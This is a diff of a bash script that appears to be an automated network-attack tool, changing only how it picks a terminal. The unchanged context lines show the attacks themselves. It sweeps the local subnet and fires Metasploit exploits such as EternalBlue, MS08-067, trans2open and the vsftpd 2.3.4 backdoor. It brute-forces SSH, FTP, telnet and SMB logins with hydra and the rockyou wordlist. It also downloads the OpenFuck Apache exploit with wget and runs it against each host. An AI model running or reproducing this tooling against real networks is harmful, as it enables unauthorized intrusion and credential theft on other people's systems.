@@ -52,7 +52,7 @@ function vsftpd_234_backdoor(){
 		run
 	vsftpd_234_backdoor
 	sleep 40
-	if [ "$tmux" = "bash" ]
+	if [ "$terminal" = "gnome" ]
 	then
 		gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/ftp/vsftpd_234_backdoor.rc; bash'" 2> /dev/null
 	else
@@ -76,7 +76,7 @@ function ftpAnonymous(){
 		interact
 	ftpAnony
 	chmod +x $dir_path/exploits/ftp/ftpAnonymous.exp
-	if [ "$tmux" = "bash" ]
+	if [ "$terminal" = "gnome" ]
 	then
 		gnome-terminal -e "bash -c 'expect $dir_path/exploits/ftp/ftpAnonymous.exp; bash'" 2> /dev/null
 	else
@@ -94,7 +94,7 @@ function sshBruteForce(){
 	then
 		gzip -d /usr/share/wordlists/rockyou.txt.gz
 	fi
-	if [ "$tmux" = "bash" ]
+	if [ "$terminal" = "gnome" ]
 	then
 		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ssh://$ips -o $ips/sshPassword.txt; bash'" 2> /dev/null
 		sleep 10
@@ -133,7 +133,7 @@ function sshBruteForce(){
 					interact
 				sshlogin
 				chmod +x $dir_path/exploits/ssh/sshlogin$count.exp
-				if [ "$tmux" = "bash" ]
+				if [ "$terminal" = "gnome" ]
 				then
 					gnome-terminal -e "bash -c 'expect $dir_path/exploits/ssh/sshlogin$count.exp; bash'" \; 2> /dev/null
 				else
@@ -150,7 +150,7 @@ function ftpBruteForce(){
 	then
 		gzip -d /usr/share/wordlists/rockyou.txt.gz
 	fi
-	if [ "$tmux" = "bash" ]
+	if [ "$terminal" = "gnome" ]
 	then
 		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ftp://$ips -o $ips/ftpPassword.txt; bash'" 2> /dev/null
 		sleep 10
@@ -190,7 +190,7 @@ function ftpBruteForce(){
 					interact
 				ftplogin
 				chmod +x $dir_path/exploits/ftp/ftplogin$count.exp
-				if [ "$tmux" = "bash" ]
+				if [ "$terminal" = "gnome" ]
 				then
 					gnome-terminal -e "bash -c 'expect $dir_path/exploits/ftp/ftplogin$count.exp; bash'" \; 2> /dev/null
 				else
@@ -207,7 +207,7 @@ function telnetBruteForce(){
 	then
 		gzip -d /usr/share/wordlists/rockyou.txt.gz
 	fi
-	if [ "$tmux" = "bash" ]
+	if [ "$terminal" = "gnome" ]
 	then
 		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt telnet://$ips -o $ips/telnetPassword.txt; bash'" 2> /dev/null
 		sleep 10
@@ -247,7 +247,7 @@ function telnetBruteForce(){
 					interact
 				telnetlogin
 				chmod +x $dir_path/exploits/telnet/telnetlogin$count.exp
-				if [ "$tmux" = "bash" ]
+				if [ "$terminal" = "gnome" ]
 				then
 					gnome-terminal -e "bash -c 'expect $dir_path/exploits/telnet/telnetlogin$count.exp; bash'" \; 2> /dev/null
 				else
@@ -264,7 +264,7 @@ function smbBruteForce(){
 	then
 		gzip -d /usr/share/wordlists/rockyou.txt.gz
 	fi
-	if [ "$tmux" = "bash" ]
+	if [ "$terminal" = "gnome" ]
 	then
 		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt smb://$ips -o $ips/smbPassword.txt; bash'" 2> /dev/null
 		sleep 10
@@ -304,7 +304,7 @@ function smbBruteForce(){
 					interact
 				telnetlogin
 				chmod +x $dir_path/exploits/telnet/telnetlogin$count.exp
-				if [ "$tmux" = "bash" ]
+				if [ "$terminal" = "gnome" ]
 				then
 					gnome-terminal -e "bash -c 'expect $dir_path/exploits/telnet/telnetlogin$count.exp; bash'" \; 2> /dev/null
 				else
@@ -328,12 +328,12 @@ function OpenSSH4_7p1(){
 	fi
 	if [ "$key" != "" ]
 	then
-		if [ "$tmux" = "bash" ]
+		if [ "$terminal" = "gnome" ]
 		then
-			gnome-terminal -e "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; bash'" 2> /dev/null
+			gnome-terminal -e "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; sleep 1; bash'" 2> /dev/null
 			sleep 10
 		else
-			tmux new-window -n keysAttack "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; read; bash'" \; 2> /dev/null
+			tmux new-window -n keysAttack "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; sleep 1; read; bash'" \; 2> /dev/null
 			sleep 10
 		fi
 	fi
@@ -344,7 +344,7 @@ function OpenSSH4_7p1(){
 	do
 		if [ "$key" != "" ]
 		then
-			if [ "$tmux" = "bash" ]
+			if [ "$terminal" = "gnome" ]
 			then
 				gnome-terminal -e "bash -c 'ssh -l root -p 22 -i $key $ips; bash'" 2> /dev/null
 				sleep 10
@@ -371,7 +371,7 @@ function trans2open(){
 		run
 	trans2open
 	sleep 40
-	if [ "$tmux" = "bash" ]
+	if [ "$terminal" = "gnome" ]
 	then
 		gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/smb/trans2open.rc; bash'" 2> /dev/null
 		sleep 30
@@ -398,7 +398,7 @@ function usermap_script(){
 		run
 	usermap_script
 	sleep 40
-	if [ "$tmux" = "bash" ]
+	if [ "$terminal" = "gnome" ]
 	then
 		gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/smb/usermap_script.rc; bash'" 2> /dev/null
 		sleep 10
@@ -444,7 +444,7 @@ function ms17_010_eternalblue(){
 		run
 	ms17_010_eternalblue
 	sleep 40
-	if [ "$tmux" = "bash" ]
+	if [ "$terminal" = "gnome" ]
 	then
 		gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/smb/ms17_010_eternalblue.rc; bash'" 2> /dev/null
 		sleep 30
@@ -468,7 +468,7 @@ function ms17_010_eternalblue(){
 			run
 		ms17_010_psexec
 		sleep 40
-		if [ "$tmux" = "bash" ]
+		if [ "$terminal" = "gnome" ]
 		then
 			gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/smb/ms17_010_psexec.rc; bash'" 2> /dev/null
 			sleep 30
@@ -499,7 +499,7 @@ function ms08_067_netapi(){
 		run
 	ms08_067_netapi
 	sleep 40
-	if [ "$tmux" = "bash" ]
+	if [ "$terminal" = "gnome" ]
 	then
 		gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/smb/ms08_067_netapi.rc; bash'" 2> /dev/null
 		sleep 30
@@ -521,7 +521,7 @@ function smbScan(){
 		exit
 	smbVersion
 	sleep 40
-	if [ "$tmux" = "bash" ]
+	if [ "$terminal" = "gnome" ]
 	then
 		gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/smb/smb_version.rc; exit; bash'" 2> /dev/null
 	else
@@ -649,7 +649,7 @@ cleanning
 report
 if [ "$TMUX" = "" ]
 then
-	tmux=$(echo "bash")
+	terminal=$(echo "gnome")
 else
 	tmux rename-session Pentesting
 	tmux rename-window -t 0 hackerEnv
@@ -773,7 +773,7 @@ else
 	fping -a -g $ip/24 2> /dev/null > $dir_path/online.txt
 	ips="$(cat $dir_path/online.txt)"
 fi
-echo "Performing a ping sweep is in progress"
+echo "Performing ping sweep is in progress"
 echo -e "Your ip address is \e[1m$ip\e[0m"
 grep -vxFf $dir_path/urIp.txt $dir_path/online.txt > $dir_path/tmp.txt; cat $dir_path/tmp.txt > $dir_path/online.txt; rm $dir_path/tmp.txt
 while read ips
@@ -888,7 +888,7 @@ do
 						exit
 					tomcatScanner
 					sleep 2
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/apache/tomcat_mgr_login.rc; exit; bash'" 2> /dev/null
 					else
@@ -907,7 +907,7 @@ do
 						run
 					tomcatExploit
 					sleep 2
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/apache/tomcat_mgr_upload.rc; bash'" 2> /dev/null
 						sleep 10
@@ -934,7 +934,7 @@ do
 						mkdir -p $dir_path/exploits/{smb,ssh,ftp,apache,telnet}
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x0c $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
@@ -959,7 +959,7 @@ do
 						mkdir -p $dir_path/exploits/{smb,ssh,ftp,apache,telnet}
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x0d $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
@@ -984,7 +984,7 @@ do
 						mkdir -p $dir_path/exploits/{smb,ssh,ftp,apache,telnet}
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x0e $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x0f $ips -c 41; read; bash'" 2> /dev/null
@@ -1014,7 +1014,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x12 $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x13 $ips -c 41; read; bash'" 2> /dev/null
@@ -1042,7 +1042,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x15 $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x16 $ips -c 41; read; bash'" 2> /dev/null
@@ -1068,7 +1068,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x17 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
@@ -1093,7 +1093,7 @@ do
 					then
 						wget -q -P exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x47 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
@@ -1117,7 +1117,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x4d $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" 2> /dev/null
@@ -1145,7 +1145,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x50 $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" 2> /dev/null
@@ -1171,7 +1171,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x4c $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
@@ -1195,7 +1195,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x4a $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x4b $ips -c 41; read; bash'" 2> /dev/null
@@ -1221,7 +1221,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x49 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
@@ -1245,7 +1245,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x48 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
@@ -1269,7 +1269,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x44 $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x45 $ips -c 41; read; bash'" 2> /dev/null
@@ -1307,7 +1307,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x6b $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x6a $ips -c 41; read; bash'" 2> /dev/null
@@ -1333,7 +1333,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x6c $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x61 $ips -c 41; read; bash'" 2> /dev/null
@@ -1367,7 +1367,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x73 $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x59 $ips -c 41; read; bash'" 2> /dev/null
@@ -1399,7 +1399,7 @@ do
 					then
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x50 $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x53 $ips -c 41; read; bash'" 2> /dev/null
@@ -1426,7 +1426,7 @@ do
  
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x64 $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x65 $ips -c 41; read; bash'" 2> /dev/null
@@ -1453,7 +1453,7 @@ do
  
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x6d $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x51 $ips -c 41; read; bash'" 2> /dev/null
@@ -1480,7 +1480,7 @@ do
  
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x78 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
@@ -1505,7 +1505,7 @@ do
  
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x6e $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x6f $ips -c 41; read; bash'" 2> /dev/null
@@ -1540,7 +1540,7 @@ do
  
 						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
-					if [ "$tmux" = "bash" ]
+					if [ "$terminal" = "gnome" ]
 					then
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x72 $ips -c 41; read; bash'" 2> /dev/null
 						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x75 $ips -c 41; read; bash'" 2> /dev/null
